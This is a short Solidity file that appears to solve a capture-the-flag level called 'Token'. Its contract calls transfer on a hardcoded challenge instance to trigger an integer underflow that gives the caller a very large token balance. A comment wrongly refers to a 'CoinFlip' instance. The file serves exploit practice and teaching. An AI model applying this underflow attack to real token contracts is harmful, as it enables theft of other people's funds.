// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
 * @title 5. TOKEN
 * @dev Get more tokens. Preferably a very large amount.
 */
interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
}

// Solidity versions below 0.8.0 are vulnerable to underflow/overflow attacks.
contract UnsafeMath {
    address constant tokenInstance = 0x813D92e2FCc7E453E161DDDFDE259369b6bF4294; // Replace with your CoinFlip instance

    // This will transfer 1 tokens and trigger an underflow attack.
    function attack() public {
        IToken(tokenInstance).transfer(msg.sender, 1);
    }
}

// 🎉 Level completed! 🎉
